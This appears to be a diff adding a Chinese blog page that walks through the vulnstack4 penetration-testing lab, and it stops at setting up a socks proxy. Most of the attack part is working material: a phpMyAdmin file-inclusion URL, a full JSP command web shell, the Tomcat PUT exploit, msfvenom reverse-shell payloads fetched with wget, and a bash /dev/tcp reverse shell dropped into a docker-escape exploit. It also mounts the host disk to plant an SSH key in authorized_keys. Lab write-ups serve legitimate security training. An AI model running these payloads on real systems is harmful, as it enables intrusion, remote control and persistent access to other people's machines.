@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Dota_128px_1143945_easyicon.net.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mamor5409.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="vulnstack4靶场">
+<meta property="og:url" content="http://mamor5409.github.io/posts/e94e95f1/index.html">
+<meta property="og:site_name" content="Mamor&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/namp.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/phpmyadmin1.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/phpmyadmin2.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/phpmyadmin_value.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/phpmyadmin_phpinfo.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/phpmyadmin_shell_error.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/struts2_1.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/struts2_2.PNG">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/struts2_shell.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/searchsploit_tomcat.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/tomcat_shell_whoami.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/msf_shell.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/docker_fdisk.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/mount_test.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/ls_test_home.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/ls_test_home_ubuntu.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/ls_test_home_ubuntu_ssh.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/cp_key.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/echo_ssh_rsa.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/cat_ssh_rsa.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/ssh_test_ubuntu.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/msf_shell2.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/autoroute.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/route_print.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/set_socks_proxy.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/smb_scan1.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/smb_scan2.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/smb_ms17_010.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/e94e95f1/ms17010_fail.png">
+<meta property="article:published_time" content="2021-07-28T01:42:31.000Z">
+<meta property="article:modified_time" content="2021-07-29T10:59:15.911Z">
+<meta property="article:author" content="Mamor">
+<meta property="article:tag" content="vulnstack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mamor5409.github.io/posts/e94e95f1/namp.png">
+
+<link rel="canonical" href="http://mamor5409.github.io/posts/e94e95f1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>vulnstack4靶场 | Mamor's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Mamor's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mamor's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://mamor5409.github.io/posts/e94e95f1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kabi.jpg">
+      <meta itemprop="name" content="Mamor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mamor's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnstack4靶场
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-07-28 09:42:31" itemprop="dateCreated datePublished" datetime="2021-07-28T09:42:31+08:00">2021-07-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-07-29 18:59:15" itemprop="dateModified" datetime="2021-07-29T18:59:15+08:00">2021-07-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/vulnstack/" itemprop="url" rel="index"><span itemprop="name">vulnstack</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+            <div class="post-description"> </div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">外网使用NAT模式  内网使用VM3 192.168.181.0&#x2F;24</span><br><span class="line">Ubuntu(ubuntu)      192.168.183.129     192.168.0.180 </span><br><span class="line">DC(Dotest123)       192.168.183.130</span><br><span class="line">Win7(Test2021)      192.168.183.128</span><br></pre></td></tr></table></figure>
+
+<p>开启web机器(ubuntu)的dokcer容器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;struts2&#x2F;s2-045</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">cd &#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;tomcat&#x2F;CVE-2017-12615&#x2F;</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">cd &#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;phpmyadmin&#x2F;CVE-2018-12613&#x2F;</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"></span><br><span class="line">sudo docker ps  </span><br></pre></td></tr></table></figure>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>sudo nmap 192.168.0.180 -sT -Pn -sV </code></p>
+<p><img src="/posts/e94e95f1/namp.png"></p>
+<p>开放了 22 2001 2002 2003 端口</p>
+<p>分别访问了下2001，2002，2003端口</p>
+<p>2001    structs2</p>
+<p>2002    tomcat</p>
+<p>2003    phpmyadmin4.8.1</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="phpmyadmin-CVE-2018-12613"><a href="#phpmyadmin-CVE-2018-12613" class="headerlink" title="phpmyadmin CVE-2018-12613"></a>phpmyadmin CVE-2018-12613</h4><p>看了下phpmyadmin的版本 是4.8.1 先验证下是否存在cve-2018-12613</p>
+<p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code> 直接运行了/etc/passwd 说明存在该漏洞</p>
+<p><img src="/posts/e94e95f1/phpmyadmin1.png"></p>
+<p>然后尝试getshell</p>
+<p>在sql处 执行 <code>select &#39;&lt;?php phpinfo();?&gt;&#39;</code></p>
+<p><img src="/posts/e94e95f1/phpmyadmin2.png"></p>
+<p>执行成功后查看 自己的sessionid  phpmyadmin的值 <code>2c8e2d642e3762699d4e070db30880b6</code></p>
+<p><img src="/posts/e94e95f1/phpmyadmin_value.png"></p>
+<p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_2c8e2d642e3762699d4e070db30880b6</code></p>
+<p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_7f9c04b6ead4e844459d4ec29658e424</code></p>
+<p>成功执行之前在sql处的phpinfo命令</p>
+<p><img src="/posts/e94e95f1/phpmyadmin_phpinfo.png"></p>
+<p>写入一句话</p>
+<p>尝试几个一句话都写入失败了，写入后会报错，可能是因为docker的原因</p>
+<p><img src="/posts/e94e95f1/phpmyadmin_shell_error.png"></p>
+<h4 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h4><p><img src="/posts/e94e95f1/struts2_1.png"></p>
+<p><img src="/posts/e94e95f1/struts2_2.PNG"></p>
+<p>可以判断是docker容器</p>
+<p>上传jsp shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;</span><br><span class="line"> &lt;%</span><br><span class="line"> %&gt;</span><br><span class="line"> &lt;HTML&gt;&lt;BODY&gt;</span><br><span class="line"> &lt;FORM METHOD&#x3D;&quot;POST&quot; NAME&#x3D;&quot;myform&quot; ACTION&#x3D;&quot;&quot;&gt;</span><br><span class="line"> &lt;INPUT TYPE&#x3D;&quot;text&quot; NAME&#x3D;&quot;cmd&quot;&gt;</span><br><span class="line"> &lt;INPUT TYPE&#x3D;&quot;submit&quot; VALUE&#x3D;&quot;Send&quot;&gt;</span><br><span class="line"> &lt;&#x2F;FORM&gt;</span><br><span class="line"> &lt;pre&gt;</span><br><span class="line"> &lt;%</span><br><span class="line"> if (request.getParameter(&quot;cmd&quot;) !&#x3D; null) &#123;</span><br><span class="line">    </span><br><span class="line">         out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;\n&lt;BR&gt;&quot;);</span><br><span class="line">         Process p &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span><br><span class="line">         OutputStream os &#x3D; p.getOutputStream();</span><br><span class="line">         InputStream in &#x3D; p.getInputStream();</span><br><span class="line">         DataInputStream dis &#x3D; new DataInputStream(in);</span><br><span class="line">         String disr &#x3D; dis.readLine();</span><br><span class="line">         while ( disr !&#x3D; null ) &#123;</span><br><span class="line">    </span><br><span class="line">                 out.println(disr); disr &#x3D; dis.readLine(); &#125;</span><br><span class="line">         &#125;</span><br><span class="line"> %&gt;</span><br><span class="line"> &lt;&#x2F;pre&gt;</span><br><span class="line"> &lt;&#x2F;BODY&gt;&lt;&#x2F;HTML&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/e94e95f1/struts2_shell.png"></p>
+<h4 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h4><p>使用kali的searchsploit搜索tomcat的poc，这里tomcat版本是8.5</p>
+<p><code>searchsploit tomcat 8.5.19</code></p>
+<p><img src="/posts/e94e95f1/searchsploit_tomcat.png"></p>
+<p><code>searchsploit -m jsp/webapps/42966.py</code></p>
+<p><code>sudo python2 42966.py -u http://192.168.0.180:2002</code></p>
+<p><code>sudo python2 42966.pu -u http://192.168.0.180:2002 -p pwn</code></p>
+<p>访问<code>http://192.168.0.180:2002/pwn.jsp</code></p>
+<p><img src="/posts/e94e95f1/tomcat_shell_whoami.png"></p>
+<p>判断是docker环境<code>ls -alh /.dockerenv</code>  <code>cat /proc/1/cgroup</code></p>
+<h4 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h4><p>生成msf马</p>
+<p><code> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.128 LPORT=4444 -f elf &gt; shell.elf</code></p>
+<p>kali开启http服务</p>
+<p><code>sudo python3 -mhttp.server 9999</code></p>
+<p>在上传的pwn.jsp通过wget下载msf</p>
+<p><code>wget http://192.168.0.128:9999/shell.elf</code></p>
+<p><code>chmod 777 shell.elf</code></p>
+<p><code>./shell.elf</code></p>
+<p>msf开启监听</p>
+<p><code>use exploit/multi/handler</code></p>
+<p><code>set payload  linux/x86/meterpreter/reverse_tcp</code></p>
+<p><code>set lhost 192.168.0.128</code></p>
+<p><code>set lport 4444</code></p>
+<p><code>run</code></p>
+<p>成功反弹到shell</p>
+<p><img src="/posts/e94e95f1/msf_shell.png"></p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><h4 id="利用CVE-2019-5736进行docker逃逸"><a href="#利用CVE-2019-5736进行docker逃逸" class="headerlink" title="利用CVE-2019-5736进行docker逃逸"></a>利用CVE-2019-5736进行docker逃逸</h4><p>payload下载地址 <a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
+<p>下载并编译main,go 修改payload替换为反弹shell </p>
+<p><code>var payload = &quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.0.128/5555 0&gt;&amp; 1&quot;</code></p>
+<p>编译生成go文件</p>
+<p><code> CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></p>
+<p>通过msf将生成的main.go上传到靶机</p>
+<p><code>upload ~/桌面/CVE-2019-5736-PoC /home</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;home </span><br><span class="line">chmod &#x2F;main</span><br><span class="line">cd &#x2F;main</span><br><span class="line">.&#x2F;main.go</span><br></pre></td></tr></table></figure>
+
+<p>在执行前先在kali上开启监听</p>
+<p><code>nc -lvvp 5555</code></p>
+<p>但是由于需要宿主机执行命令 才能去触发payload反弹shell</p>
+<p>运行完之后 msf进入shell就会卡住…所以就换一种方法 可以使用–privileged（特权模式）进行逃逸</p>
+<h4 id="利用–privileged特权模式逃逸"><a href="#利用–privileged特权模式逃逸" class="headerlink" title="利用–privileged特权模式逃逸"></a>利用–privileged特权模式逃逸</h4><p>使用特权模式向宿主机的硬盘中写入ssh私钥，实现ssh免密登录宿主机</p>
+<p>1.查看磁盘文件 <code>fdisk -l</code></p>
+<p><img src="/posts/e94e95f1/docker_fdisk.png"></p>
+<p>2.查看设备文件 <code>ls /dev</code></p>
+<p>3.新建目录进行挂载      <code>mkdir /test</code></p>
+<p>4.将/dev/sda1挂载到/test目录中  <code>mount /dev/sda1 /test</code></p>
+<p>5.查看是否挂载成功 <code>ls /test</code></p>
+<p><img src="/posts/e94e95f1/mount_test.png"></p>
+<p>6.在kali本地上生成ssh密钥 <code>ssh-keygen -f test</code> ，然后会生成<code>test</code> <code>test.pub</code></p>
+<p>赋予600权限<code>chmod 600 test</code></p>
+<p>7.将生成的密钥写入到目标机器中</p>
+<p>由于前面将 <code>sda1</code>挂载到了<code>/test</code> 所以访问/test/home也就等同于去访问宿主机的/home目录</p>
+<p><code>ls /test/home</code></p>
+<p><img src="/posts/e94e95f1/ls_test_home.png"></p>
+<p>查看所有文件<code>ls -alh /test/home/ubuntu</code></p>
+<p><img src="/posts/e94e95f1/ls_test_home_ubuntu.png"></p>
+<p>查看.ssh文件 <code>ls -alh /test/home/ubuntu/.ssh/</code></p>
+<p><img src="/posts/e94e95f1/ls_test_home_ubuntu_ssh.png"></p>
+<p><code>cp -avx /test/home/ubuntu/.ssh/id_rsa.pub /test/home/ubuntu/.ssh/authorized_keys</code> # -avx将权限也一起赋予</p>
+<p><img src="/posts/e94e95f1/cp_key.png"></p>
+<p><code>echo &gt; /test/home/ubuntu/.ssh/authorized_keys</code></p>
+<p><code>cat test.pub</code> </p>
+<p><code>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1/QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo/mh+Upm+oqqvlkX/1PYvsUkXOpLBm/Oy/ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq/o95qGkKaMdPkHWfiDiag2B+BFS/Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K/Bg3rSlUPD6ibogfIQMTR1Vint2gs= kali@kali2020</code></p>
+<br>
+
+<p><code>echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1/QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo/mh+Upm+oqqvlkX/1PYvsUkXOpLBm/Oy/ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq/o95qGkKaMdPkHWfiDiag2B+BFS/Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K/Bg3rSlUPD6ibogfIQMTR1Vint2gs= kali@kali2020&#39; &gt;&gt; /test/home/ubuntu/.ssh/authorized_keys    </code># 将ssh秘钥写入authorized_keys文件</p>
+<p><img src="/posts/e94e95f1/echo_ssh_rsa.png"></p>
+<p>查看是否写入成功，发现还是没成功，使用<code>echo &gt; /test/home/ubuntu/.ssh/authorized_keys </code>无法清除原有的值，应该是没有写入权限</p>
+<p><code> cat /test/home/ubuntu/.ssh/authorized_keys</code></p>
+<p><img src="/posts/e94e95f1/cat_ssh_rsa.png"></p>
+<p>尝试去上传一个key.sh，内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp -avx &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">echo &gt; &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1&#x2F;QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo&#x2F;mh+Upm+oqqvlkX&#x2F;1PYvsUkXOpLBm&#x2F;Oy&#x2F;ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq&#x2F;o95qGkKaMdPkHWfiDiag2B+BFS&#x2F;Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K&#x2F;Bg3rSlUPD6ibogfIQMTR1Vint2gs&#x3D; kali@kali2020&#39; &gt; &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">cat &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>开启http服务使用靶机下载</p>
+<p><code>sudo python3 -m http.server 9999</code></p>
+<p><code>wget http://192.168.0.128:9999</code></p>
+<p><code>chmod 777 key.sh</code></p>
+<p><code>./key.sh</code></p>
+<p>还是写入失败了，看了下师傅们也是这样做的没啥问题，然后我就去ubuntu靶机上试了下发现也没法使用echo写入，只能通过<code>sudo vim authorized_keys</code>手动将在kali上生成的密钥复制进去，才能在kali上免密登录</p>
+<p><code>ssh -i test ubuntu@192.168.0.181</code></p>
+<p><img src="/posts/e94e95f1/ssh_test_ubuntu.png"></p>
+<h4 id="上线msf-1"><a href="#上线msf-1" class="headerlink" title="上线msf"></a>上线msf</h4><p>然后在msf生成木马，使用python开启gttp服务，下载后连接shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.128 LPORT&#x3D;8888 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/e94e95f1/msf_shell2.png"></p>
+<p><code>use exploit/multi/handler </code></p>
+<p> <code>set payload  linux/x86/meterpreter/reverse_tcp</code></p>
+<p>突然不小心把shell.elf断掉了 重新上线了一个 session 12</p>
+<h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><p><code> use post/multi/manage/autoroute</code></p>
+<p><img src="/posts/e94e95f1/autoroute.png"></p>
+<p><code>route print</code>查看路由</p>
+<p><img src="/posts/e94e95f1/route_print.png"></p>
+<h4 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h4><p><code>use auxiliary/server/socks_proxy</code></p>
